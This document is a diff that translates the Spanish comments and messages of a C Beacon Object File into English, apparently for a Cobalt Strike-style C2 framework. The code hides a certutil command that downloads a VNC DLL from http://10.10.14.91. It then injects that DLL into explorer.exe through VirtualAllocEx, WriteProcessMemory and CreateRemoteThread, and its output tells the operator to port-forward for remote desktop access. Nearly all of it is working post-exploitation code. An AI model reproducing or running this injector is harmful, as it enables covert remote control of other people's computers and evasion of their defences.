@@ -21,14 +21,14 @@
 #include "beacon.h"
 
 // ================================
-// IMPORTS DIRECTOS
+// DIRECT IMPORTS
 // ================================
 extern PVOID __imp_LoadLibraryA;
 extern PVOID __imp_GetProcAddress;
 extern PVOID __imp_CloseHandle;
 
 // ================================
-// DEFINICIONES MANUALES
+// MANUAL DEFINITIONS
 // ================================
 #define TH32CS_SNAPPROCESS 0x00000002
 
@@ -46,7 +46,7 @@ typedef struct _PROCESSENTRY32 {
 } PROCESSENTRY32, *LPPROCESSENTRY32;
 
 // ================================
-// FUNCIÓN AUX: EJECUTAR COMANDO OCULTO
+// HELPER FUNCTION: RUN HIDDEN COMMAND
 // ================================
 void execute_cmd_hidden(char* cmd) {
     HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
@@ -76,12 +76,12 @@ void execute_cmd_hidden(char* cmd) {
 }
 
 // ================================
-// FUNCIÓN PRINCIPAL
+// MAIN FUNCTION
 // ================================
 void go(char *args, int alen) {
-    BeaconPrintf(CALLBACK_OUTPUT, "[VNC] Iniciando descarga e inyección...");
+    BeaconPrintf(CALLBACK_OUTPUT, "[VNC] Starting download and injection...");
 
-    // === Paso 1: Obtener %TEMP% ===
+    // === Step 1: Get %TEMP% ===
     typedef DWORD (WINAPI *GETENVVARA)(LPCSTR, LPSTR, DWORD);
     HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
     GETENVVARA pGetEnvVarA = (GETENVVARA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "GetEnvironmentVariableA");
@@ -90,34 +90,34 @@ void go(char *args, int alen) {
     char dll_path[512] = {0};
 
     if (!pGetEnvVarA || !pGetEnvVarA("TEMP", temp_path, sizeof(temp_path))) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudo obtener %%TEMP%%");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not get %%TEMP%%");
         return;
     }
 
-    // ✅ Reemplazo de snprintf → wsprintfA (NO CRT)
-    // Cargar user32.dll y resolver wsprintfA dinámicamente
+    // snprintf replacement -> wsprintfA (NO CRT)
+    // Load user32.dll and resolve wsprintfA dynamically
     HMODULE hUser32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("user32.dll");
     if (!hUser32) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudo cargar user32.dll para wsprintfA");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not load user32.dll for wsprintfA");
         return;
     }
 
     typedef int (WINAPI *WSPRINTFA)(LPSTR, LPCSTR, ...);
     WSPRINTFA pwsprintfA = (WSPRINTFA)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hUser32, "wsprintfA");
     if (!pwsprintfA) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudo resolver wsprintfA");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not resolve wsprintfA");
         return;
     }
 
     pwsprintfA(dll_path, "%s\\winvnc.x64.dll", temp_path);
 
-    // === Paso 2: Descargar DLL ===
+    // === Step 2: Download DLL ===
     char cmd[1024];
     pwsprintfA(cmd, "certutil -urlcache -split -f http://10.10.14.91/winvnc.x64.dll \"%s\"", dll_path);
-    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Descargando: %s", cmd);
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Downloading: %s", cmd);
     execute_cmd_hidden(cmd);
 
-    // === Paso 3: Cargar Toolhelp32 dinámicamente ===
+    // === Step 3: Load Toolhelp32 dynamically ===
     typedef HANDLE (WINAPI *CREATE_SNAPSHOT)(DWORD, DWORD);
     typedef BOOL (WINAPI *PROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
     typedef BOOL (WINAPI *PROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
@@ -127,14 +127,14 @@ void go(char *args, int alen) {
     PROCESS32NEXT pProcess32Next = (PROCESS32NEXT)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "Process32Next");
 
     if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudieron resolver funciones de Toolhelp32");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not resolve Toolhelp32 functions");
         return;
     }
 
-    // === Paso 4: Buscar explorer.exe ===
+    // === Step 4: Find explorer.exe ===
     HANDLE hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Snapshot fallido");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Snapshot failed");
         return;
     }
 
@@ -151,7 +151,7 @@ void go(char *args, int alen) {
                 pe.szExeFile[12] == '\0') {
 
                 target_pid = pe.th32ProcessID;
-                BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Encontrado explorer.exe PID: %d", target_pid);
+                BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Found explorer.exe PID: %d", target_pid);
                 break;
             }
         } while (pProcess32Next(hSnapshot, &pe));
@@ -160,47 +160,47 @@ void go(char *args, int alen) {
     ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hSnapshot);
 
     if (target_pid == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se encontró explorer.exe");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] explorer.exe not found");
         return;
     }
 
-    // === Paso 5: Abrir proceso ===
+    // === Step 5: Open process ===
     typedef HANDLE (WINAPI *OPENPROCESS)(DWORD, BOOL, DWORD);
     OPENPROCESS pOpenProcess = (OPENPROCESS)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "OpenProcess");
     if (!pOpenProcess) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] OpenProcess no disponible");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] OpenProcess not available");
         return;
     }
 
     HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
     if (!hProcess) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] No se pudo abrir el proceso");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] Could not open the process");
         return;
     }
 
-    // === Paso 6: Reservar memoria para la ruta ===
+    // === Step 6: Allocate memory for the path ===
     typedef LPVOID (WINAPI *VIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
     VIRTUALALLOCEX pVirtualAllocEx = (VIRTUALALLOCEX)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "VirtualAllocEx");
 
     LPVOID pRemoteMem = pVirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteMem) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] VirtualAllocEx falló");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] VirtualAllocEx failed");
         ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
         return;
     }
 
-    // === Paso 7: Escribir ruta ===
+    // === Step 7: Write path ===
     typedef BOOL (WINAPI *WRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
     WRITEPROCESSMEMORY pWriteProcessMemory = (WRITEPROCESSMEMORY)((FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "WriteProcessMemory");
 
     SIZE_T written;
     if (!pWriteProcessMemory(hProcess, pRemoteMem, dll_path, strlen(dll_path) + 1, &written)) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] WriteProcessMemory falló");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] WriteProcessMemory failed");
         ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
         return;
     }
 
-    // === Paso 8: Inyectar LoadLibraryA ===
+    // === Step 8: Inject LoadLibraryA ===
     typedef HMODULE (WINAPI *LOADLIBRARYA)(LPCSTR);
     LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)__imp_LoadLibraryA;
 
@@ -209,16 +209,16 @@ void go(char *args, int alen) {
 
     HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMem, 0, NULL);
     if (!hThread) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] CreateRemoteThread falló");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF ERROR] CreateRemoteThread failed");
         ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] ¡DLL inyectada en explorer.exe!");
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] DLL injected into explorer.exe!");
     ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hThread);
     ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Ejecuta en Beacon:");
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Run in Beacon:");
     BeaconPrintf(CALLBACK_OUTPUT, "    portfwd add 5900 127.0.0.1 5900");
-    BeaconPrintf(CALLBACK_OUTPUT, "    Y conéctate con VNC Viewer a 127.0.0.1:5900");
+    BeaconPrintf(CALLBACK_OUTPUT, "    Then connect with VNC Viewer to 127.0.0.1:5900");
 }
